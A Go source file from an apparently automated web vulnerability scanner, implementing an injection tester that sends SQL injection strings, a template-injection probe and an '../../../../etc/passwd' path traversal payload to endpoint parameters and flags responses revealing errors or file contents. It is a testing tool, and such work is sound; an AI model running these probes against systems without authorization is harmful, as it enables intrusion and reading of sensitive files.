package researcher

import (
	"context"
	"fmt"
	"net/url"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/vKS-Rajput/doge/pkg/domain"
)

// InjectionResearcher tests for input injection vulnerabilities including
// SQL injection, command injection, path traversal, SSTI, and SSRF.
type InjectionResearcher struct {
	httpClient HTTPClient
}

// NewInjectionResearcher creates a new injection researcher.
func NewInjectionResearcher(httpClient HTTPClient) *InjectionResearcher {
	return &InjectionResearcher{httpClient: httpClient}
}

// Type returns domain.ResearcherInjection.
func (r *InjectionResearcher) Type() domain.ResearcherType {
	return domain.ResearcherInjection
}

// Execute performs targeted injection experiments against input parameters.
func (r *InjectionResearcher) Execute(ctx context.Context, brief *domain.MissionBrief) (*domain.MissionResult, error) {
	start := time.Now()
	result := &domain.MissionResult{
		MissionID:      brief.ID,
		ResearcherType: domain.ResearcherInjection,
		Status:         domain.MissionActive,
	}
	requestCount := 0

	authHeaders := make(map[string]string)
	for _, token := range brief.Credentials {
		authHeaders["Authorization"] = "Bearer " + token
		break
	}

	for _, ep := range brief.KnownEndpoints {
		if requestCount >= brief.MaxRequests {
			break
		}

		u, err := url.Parse(ep)
		if err != nil {
			continue
		}

		// Check if endpoint has query parameters
		q := u.Query()
		if len(q) == 0 {
			// Add test parameter to path if no query params exist
			q.Set("id", "1")
			q.Set("q", "test")
		}

		for param := range q {
			if requestCount >= brief.MaxRequests {
				break
			}

			// Test 1: SQL Injection Error & Boolean Probe
			sqliPayloads := []string{"' OR '1'='1", "1' AND 1=2 -- -", "1' ORDER BY 100 -- -"}
			for _, payload := range sqliPayloads {
				if requestCount >= brief.MaxRequests {
					break
				}
				orig := q.Get(param)
				q.Set(param, payload)
				u.RawQuery = q.Encode()
				targetURL := u.String()
				q.Set(param, orig)

				ev, err := r.httpClient.Do(ctx, "GET", targetURL, authHeaders, "")
				if err != nil {
					continue
				}
				requestCount++
				ev.Description = fmt.Sprintf("SQLi probe on param [%s] at %s", param, targetURL)
				result.Evidence = append(result.Evidence, *ev)

				// Detect SQL syntax errors in body
				lower := strings.ToLower(ev.ResponseBody)
				if strings.Contains(lower, "syntax error") || strings.Contains(lower, "sqlite3.operationalerror") ||
					strings.Contains(lower, "ora-01756") || strings.Contains(lower, "pg_query()") ||
					strings.Contains(lower, "mysql_fetch_array()") {
					cand := domain.CandidateVulnerability{
						ID:          uuid.New(),
						Type:        "SQL_INJECTION_SYNTAX_ERROR_DISCLOSED",
						Title:       fmt.Sprintf("SQL Injection via Parameter %s on %s", param, ep),
						Description: fmt.Sprintf("Server returned database syntax error when injected with payload %s on parameter %s.", payload, param),
						Severity:    string(domain.SeverityCritical),
						Endpoint:    ep,
						DiscoveredAt: time.Now().UTC(),
					}
					result.CandidateFindings = append(result.CandidateFindings, cand)
				}
			}

			// Test 2: SSTI (Server-Side Template Injection)
			sstiPayload := "{{7*7}}"
			orig := q.Get(param)
			q.Set(param, sstiPayload)
			u.RawQuery = q.Encode()
			targetURL := u.String()
			q.Set(param, orig)

			evSSTI, err := r.httpClient.Do(ctx, "GET", targetURL, authHeaders, "")
			if err == nil {
				requestCount++
				evSSTI.Description = fmt.Sprintf("SSTI probe on param [%s] at %s", param, targetURL)
				result.Evidence = append(result.Evidence, *evSSTI)

				if strings.Contains(evSSTI.ResponseBody, "49") && !strings.Contains(evSSTI.ResponseBody, "{{7*7}}") {
					cand := domain.CandidateVulnerability{
						ID:          uuid.New(),
						Type:        "SSTI_TEMPLATE_EXPRESSION_EVALUATED",
						Title:       fmt.Sprintf("Server-Side Template Injection on %s via %s", ep, param),
						Description: fmt.Sprintf("Template expression {{7*7}} evaluated to 49 on parameter %s.", param),
						Severity:    string(domain.SeverityCritical),
						Endpoint:    ep,
						DiscoveredAt: time.Now().UTC(),
					}
					result.CandidateFindings = append(result.CandidateFindings, cand)
				}
			}

			// Test 3: Path Traversal
			traversalPayload := "../../../../etc/passwd"
			q.Set(param, traversalPayload)
			u.RawQuery = q.Encode()
			targetURL = u.String()
			q.Set(param, orig)

			evTrav, err := r.httpClient.Do(ctx, "GET", targetURL, authHeaders, "")
			if err == nil {
				requestCount++
				evTrav.Description = fmt.Sprintf("Path traversal probe on param [%s] at %s", param, targetURL)
				result.Evidence = append(result.Evidence, *evTrav)

				if strings.Contains(evTrav.ResponseBody, "root:x:0:0:") {
					cand := domain.CandidateVulnerability{
						ID:          uuid.New(),
						Type:        "PATH_TRAVERSAL_ARBITRARY_FILE_READ",
						Title:       fmt.Sprintf("Path Traversal Arbitrary File Read on %s", ep),
						Description: fmt.Sprintf("Parameter %s accepts relative path traversal sequences, returning /etc/passwd contents.", param),
						Severity:    string(domain.SeverityCritical),
						Endpoint:    ep,
						DiscoveredAt: time.Now().UTC(),
					}
					result.CandidateFindings = append(result.CandidateFindings, cand)
				}
			}
		}
	}

	result.RequestsMade = requestCount
	result.Duration = time.Since(start)
	result.Status = domain.MissionCompleted
	result.Summary = fmt.Sprintf("Injection Research: %d requests made across %d endpoints, %d candidate findings discovered",
		requestCount, len(brief.KnownEndpoints), len(result.CandidateFindings))

	return result, nil
}
